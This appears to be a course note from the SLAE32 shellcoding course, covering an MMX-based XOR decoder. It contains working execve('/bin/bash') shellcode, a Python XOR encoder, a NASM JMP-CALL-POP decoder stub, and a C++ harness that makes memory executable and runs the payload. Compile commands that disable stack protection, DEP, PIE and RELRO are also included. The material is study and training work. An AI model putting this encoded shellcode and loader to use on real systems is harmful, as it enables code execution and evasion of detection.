# XOR-MMX

## SHELL (PREP)
In order to understand how `execve` works, look at the arguments it takes, and how this translates to the registers:  

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
**execve does NOT need a return if successful**

```nasm
EAX = syscall
EBX = /bin/bash, 0x0
ECX = Address of /bin/bash, 0x00000000
EDX = 0x00000000
ESI -> /bin/bash
```

## Python (PREP)
Using the following Python3 script `XOR-encoder.py` to encode the shellcode with `0xAA`
**Note: No bytes contained in shellcode can match the `0xAA` for this lesson**  
```python
#!/usr/bin/python3

# Python3 XOR Encoder
# SLAE32

shellcode = (
# Place shellcode here
b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

encoded = ""
encoded2 = ""

print ("Encoded shellcode with XOR 0xAA...\n")

for x in shellcode:
    # XOR Encoding
    y = x^0xAA
    encoded += "\\x"
    encoded += "%02x" % y

    encoded2 += "0x"
    encoded2 += "%02x," % y

print(encoded)
print()
print(encoded2)
print()

print("Length: %d" % len(shellcode))
```

## NASM  

Level 6 (`EXECVE-Stack` shellcode) before `0xAA XOR` (`MMX`) Encoding:
```nasm
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Level 6 (`EXECVE-Stack` shellcode) after `0xAA XOR` (`MMX`) Encoding:
```nasm
"\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
```

### EXECVE  
`MMX` operates on **8 bytes** at a time.  Shellcode needs to be divisible by `8`.  
```nasm
; EXECVE-MMX-XOR-decoder.nasm (JMP-CALL-POP)
; SLAE32
; XOR Decoder using MMX, no NULL, using shellcode from Module 2-6 as the basis
;
; MMX operates on 8 bytes at a time.  Shellcode needs to be divisible by 8

global _start

section .text
_start:
    jmp short call_decoder


decoder:
    pop edi                     ; Get the address of decoder_value (since it's the return location after call decoder)
    lea esi, [edi + 8]          ; Get the address of EncodedShellcode, which is after the 8 bytes of decoder_value

    xor ecx, ecx
    mov cl, 4                   ; 8 * 4 == 32.  Shellcode is 30 bytes.  Execve will not grab those 2 bytes that are overwriting something.
    ; Afterthought:  Best bet is to pad this using NOPs or similar until it is divisible by 8


decode:
    movq mm0, qword [edi]       ; Grab 8 bytes of decoder_value (0xAA)
    movq mm1, qword [esi]       ; Grab 8 bytes of Encoded_Shellcode
    pxor mm0, mm1               ; XOR them (since the decode XOR is 0xAA)

    movq qword [esi], mm0       ; Put the clean shellcode back in place where it goes

    add esi, 0x8                ; Get to next 8 bytes of shellcode
    loop decode                 ; Loop over decode until ECX (4) is decremented to 0.

    jmp short EncodedShellcode


call_decoder:
    call decoder
    decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa        ; 8 bytes of 0xAA (MMX works in 8 bytes)
    EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0xc8,0xc3,0xc4,0x85,0xc2,0x85,0x85,0x85,0x85,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a

```


---


## Convert to Shellcode  

Use the [compile.sh](../compile.sh) script that will automatically compile, assemble, link, and then print the shellcode for CPP consumption.  


---


## CPP  
### Header file (.h)  
```cpp
/*
Following video: Module 2-11: XOR using MMX

    /mnt/git/NASM/SLAE32/2-11_XOR-MMX/execve-xor:     file format elf32-i386
    Disassembly of section .text:
    08049000 <_start>:
     8049000:       eb 1b                   jmp    804901d <call_decoder>
    08049002 <decoder>:
     8049002:       5f                      pop    edi
     8049003:       8d 77 08                lea    esi,[edi+0x8]
     8049006:       31 c9                   xor    ecx,ecx
     8049008:       b1 04                   mov    cl,0x4
    0804900a <decode>:
     804900a:       0f 6f 07                movq   mm0,QWORD PTR [edi]
     804900d:       0f 6f 0e                movq   mm1,QWORD PTR [esi]
     8049010:       0f ef c1                pxor   mm0,mm1
     8049013:       0f 7f 06                movq   QWORD PTR [esi],mm0
     8049016:       83 c6 08                add    esi,0x8
     8049019:       e2 ef                   loop   804900a <decode>
     804901b:       eb 0d                   jmp    804902a <EncodedShellcode>
    0804901d <call_decoder>:
     804901d:       e8 e0 ff ff ff          call   8049002 <decoder>
    08049022 <decoder_value>:
     8049022:       aa                      stos   BYTE PTR es:[edi],al
     8049023:       aa                      stos   BYTE PTR es:[edi],al
     8049024:       aa                      stos   BYTE PTR es:[edi],al
     8049025:       aa                      stos   BYTE PTR es:[edi],al
     8049026:       aa                      stos   BYTE PTR es:[edi],al
     8049027:       aa                      stos   BYTE PTR es:[edi],al
     8049028:       aa                      stos   BYTE PTR es:[edi],al
     8049029:       aa                      stos   BYTE PTR es:[edi],al
    0804902a <EncodedShellcode>:
     804902a:       9b                      fwait
     804902b:       6a fa                   push   0xfffffffa
     804902d:       c2 c8 cb                ret    0xcbc8
     8049030:       d9 c2                   fld    st(2)
     8049032:       c2 c8 c3                ret    0xc3c8
     8049035:       c4 85 c2 85 85 85       les    eax,FWORD PTR [ebp-0x7a7a7a3e]
     804903b:       85 23                   test   DWORD PTR [ebx],esp
     804903d:       49                      dec    ecx
     804903e:       fa                      cli    
     804903f:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
     8049042:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
     8049045:       a1                      .byte 0xa1
     8049046:       67                      addr16
     8049047:       2a                      .byte 0x2a
*/

unsigned char shellcode[] = {
"\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e"
"\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff"
"\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\xc8\xcb"
"\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23"
"\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
};

unsigned int shellcode_len = sizeof(shellcode)-1;
```

### CPP file (.cpp)  
```cpp
#include <stdio.h>
#include <string.h>
#include <stdint.h>		// Requirement for intptr_t/uintptr_t
// @ts-ignore
#include <sys/mman.h>	// Linux requirement for mmap / mprotect

// Clean place to keep all shellcode
#include "shellcode.h"

// Compile (x86) with:
// Note: Requires package gcc-multilib if on an x64 system
// gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
//
// DISABLE ALL PROTECTIONS:
// gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
//
// Compile (x64) with:
// gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>

int main()
{
	for (int i = 0; i < shellcode_len; i++){
		// printf("%02x ",*(shellcode + i));	// Output example: 31 c0 50 68
		printf("\\x%02x",*(shellcode + i));		// Output example: \x31\xc0\x50\x68
	}
	printf("\n");
	printf("Shellcode Length: %d\n", shellcode_len);

	// =====================================================
	// SLAE-32 method
	// Create a function pointer, that points to the raw shellcode, then call the shellcode pointer
	//
	int (*shellcode_func_ptr)() = (int(*)())shellcode;
	mprotect((void*)((uintptr_t)shellcode & ~0xFFF), 8192, PROT_READ|PROT_WRITE|PROT_EXEC);	// Required to add this to make the PAGE the shellcode is in, executable
	printf("Shellcode address: %p\n", shellcode_func_ptr);
	shellcode_func_ptr();
	// =====================================================


	// =====================================================
	// Memory Alloc method
	//
	// int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	// int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	
	// void *shellcode_mem_alloc = mmap(0, shellcode_len, prot, flags, -1, 0);

	// if(shellcode_mem_alloc == MAP_FAILED)
	// {
	// 	perror("mmap");
	// 	return 1;	// Error'd out
	// }
	// else{
	// 	memcpy(shellcode_mem_alloc, shellcode, shellcode_len);
	// 	((void(*)())shellcode_mem_alloc)();
	// }
	// =====================================================


	return 0;
}
```


---

## Compilation (GCC)

### Compile (`x86`):
_Note: Requires package `gcc-multilib` if on an `x64` system_
```shell
gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
```

### DISABLE ALL PROTECTIONS:
```shell
gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
```

### Compile (`x64`):
```shell
gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>
```